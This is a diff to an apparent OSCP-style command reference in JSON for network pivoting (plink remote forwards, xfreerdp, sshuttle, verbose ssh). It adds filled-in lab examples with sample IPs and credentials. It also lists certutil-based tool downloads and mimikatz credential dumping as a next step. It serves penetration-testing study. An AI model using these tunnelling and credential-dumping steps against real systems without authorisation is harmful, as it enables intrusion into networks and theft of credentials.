@@ -78,8 +78,15 @@
         "Network error: Software caused connection abort - firewall blocking outbound SSH"
       ],
       "prerequisites": [],
-      "alternatives": ["ssh-remote-forward", "chisel-client", "plink-remote-forward-windows"],
-      "next_steps": ["nmap-service-scan", "nc-listener-setup"],
+      "alternatives": [
+        "ssh-remote-forward",
+        "chisel-client",
+        "plink-remote-forward-windows"
+      ],
+      "next_steps": [
+        "nmap-service-scan",
+        "nc-listener-setup"
+      ],
       "troubleshooting": {
         "Plink not found": "Download Plink: powershell wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -O plink.exe, or use certutil: certutil -urlcache -f https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe plink.exe",
         "Store key in cache warning": "Answer 'y' to trust SSH server key fingerprint (first connection only)",
@@ -90,7 +97,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "On SSH server (Kali): Verify listening port: ss -ntplu | grep <REMOTE_PORT> Test connection from Kali: nc -zv 127.0.0.1 <REMOTE_PORT> Access forwarded service: xfreerdp /v:127.0.0.1:<REMOTE_PORT> (if forwarding RDP) Keep Plink window open (closing terminates tunnel) For background execution: Use cmd.exe /c start /B plink.exe ..."
-      }
+      },
+      "filled_example": "plink.exe -ssh -l kali -pw kali -R 9833:172.16.50.217:3389 192.168.45.x"
     },
     {
       "id": "xfreerdp-connect",
@@ -154,9 +162,15 @@
         "Certificate verification failed - use /cert-ignore flag",
         "CredSSP encryption error - downgrade CredSSP with /sec:rdp or update system"
       ],
-      "next_steps": ["mimikatz-sekurlsa-logonpasswords", "systeminfo-windows", "whoami-priv"],
+      "next_steps": [
+        "mimikatz-sekurlsa-logonpasswords",
+        "systeminfo-windows",
+        "whoami-priv"
+      ],
       "alternatives": [],
-      "prerequisites": ["nmap-service-scan"],
+      "prerequisites": [
+        "nmap-service-scan"
+      ],
       "troubleshooting": {
         "Connection timeout": "Verify RDP port open: sudo nmap -p <PORT> -Pn -v <TARGET>, check firewall rules",
         "CredSSP encryption oracle remediation": "Downgrade security: xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /cert-ignore /sec:rdp",
@@ -167,7 +181,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Open cmd.exe or PowerShell in RDP session Transfer files via clipboard or shared drive: +drive:share,/tmp Check user privileges: whoami /priv Enumerate network interfaces: ipconfig /all Set up port forwarding if multi-homed: ssh.exe, plink, or netsh"
-      }
+      },
+      "filled_example": "xfreerdp /v:192.168.50.63:3389 /u:rdp_admin /p:P@ssw0rd! /cert-ignore +clipboard"
     },
     {
       "id": "ssh-version",
@@ -175,7 +190,7 @@
       "category": "pivoting",
       "subcategory": "ssh-tunneling",
       "command": "ssh -V",
-      "description": "Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires ≥7.6)",
+      "description": "Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires \u22657.6)",
       "tags": [
         "SSH",
         "ENUMERATION",
@@ -187,8 +202,8 @@
       },
       "success_indicators": [
         "OpenSSH version displayed (e.g., OpenSSH_8.2p1)",
-        "Version ≥7.6 required for remote dynamic forwarding (-R port only)",
-        "Version ≥7.4 required for ProxyJump support"
+        "Version \u22657.6 required for remote dynamic forwarding (-R port only)",
+        "Version \u22657.4 required for ProxyJump support"
       ],
       "failure_indicators": [
         "Command not found - SSH client not installed"
@@ -245,7 +260,8 @@
       "prerequisites": [],
       "troubleshooting": {},
       "notes": "Use when SSH tunnels fail silently.\n\nVerbose output shows:\nkey exchange, authentication attempts, tunnel establishment, connection forwarding.\n\nCritical for diagnosing 'port forward works but connection hangs' scenarios.",
-      "oscp_relevance": "medium"
+      "oscp_relevance": "medium",
+      "filled_example": "ssh -vvv database_admin@10.4.50.215"
     },
     {
       "id": "sshuttle-vpn",
@@ -306,9 +322,18 @@
         "Permission denied - SSH authentication failed",
         "Fatal: server died - Python not available on pivot host"
       ],
-      "prerequisites": ["ssh-connect"],
-      "alternatives": ["ssh-dynamic-forward", "chisel-socks", "ligolo-server"],
-      "next_steps": ["nmap-service-scan", "bloodhound-ingest"],
+      "prerequisites": [
+        "ssh-connect"
+      ],
+      "alternatives": [
+        "ssh-dynamic-forward",
+        "chisel-socks",
+        "ligolo-server"
+      ],
+      "next_steps": [
+        "nmap-service-scan",
+        "bloodhound-ingest"
+      ],
       "troubleshooting": {
         "server died with error code 127": "Python not found on pivot - install python3 or use alternative tunneling",
         "NAT traversal failed": "Requires iptables FORWARD rules - may need sudo on pivot or use ssh-dynamic-port-forward instead",
@@ -319,7 +344,8 @@
       "oscp_relevance": "medium",
       "methodology_guidance": {
         "after_success": "Verify routing: ip route | grep tun Test connectivity: ping <INTERNAL_IP> Scan internal network: nmap -sT <INTERNAL_SUBNET>/24 (no proxychains needed) Access services directly: psql -h <INTERNAL_IP>, smbclient //<INTERNAL_IP>/share"
-      }
+      },
+      "filled_example": "sshuttle -r database_admin@10.4.50.215 172.16.50.0/24 --dns"
     }
   ]
 }
